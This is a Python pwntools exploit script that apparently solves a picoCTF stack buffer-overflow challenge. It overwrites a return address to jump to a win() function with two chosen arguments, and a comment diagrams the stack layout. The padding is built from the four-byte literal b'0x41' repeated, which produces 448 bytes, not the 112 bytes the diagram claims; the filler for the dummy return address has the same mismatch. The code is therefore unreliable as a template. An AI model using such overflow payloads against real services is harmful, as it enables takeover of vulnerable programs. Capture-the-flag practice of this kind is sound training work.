from pwn import *

context.log_level = 'debug'

host = 'saturn.picoctf.net'
port = 50202


p = remote(host, port)

p.recvline()

payload = b''
payload += b'0x41' * 112 # Junk
payload += p32(0x08049296) # Return address, Jump to win().
payload += b'0x42' * 4 # Dummy return address to main().
payload += p32(0xcafef00d) # 1st argument
payload += p32(0xf00df00d) # 2nd argument

p.sendline(payload)

'''
When send payload, the stack is as follows.
------------------------------------------------------
|           Junk 112 bytes, b'0x41' * 112            | <- Offset
------------------------------------------------------
|    Return address to win() 4 bytes, 0x08049296     | <- EIP
------------------------------------------------------
| Dummy return address to main() 4 bytes, b'0x42' * 4|
------------------------------------------------------
|               Arg1 4 bytes, 0xcafef00d             |
------------------------------------------------------
|               Arg2 4 bytes, 0xf00df00d             |
------------------------------------------------------
'''

p.recvall()